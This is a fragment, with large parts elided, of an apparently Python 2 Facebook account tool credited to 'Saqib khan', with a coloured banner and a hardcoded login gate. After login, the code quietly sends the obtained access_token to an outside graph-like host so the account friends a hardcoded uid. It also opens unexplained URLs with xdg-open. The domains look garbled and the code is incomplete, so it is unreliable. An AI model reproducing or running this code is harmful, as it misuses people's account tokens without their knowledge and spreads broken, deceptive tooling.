...
jalan("   \033[1;93m Welcome to Creat by Saqib ")

jalan("\033[1;97m•◈•──────────•◈•\033[1;96mhappyboy\033[1;96m•◈•──────────•◈•")
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://www.Yvhjkh.com/UCsdJQbRf0xpvwaDu1rqgJuA')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.gjhgj.com/UCsdJQbRf0xpvwaDu1rqgJuA')
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://www.yjgjn.com/channel/UCsdJQbRf0xpvwaDugJuA')
				requests.post('https://graph.fcjjkn.com/me/friends?method=post&uids=gwinsa3&access_token='+z['access_token'])
				menu()
...
def menu():
	...
	print "\033[1;32;40m[2] \033[1;33;40m══Saqib khan"																														
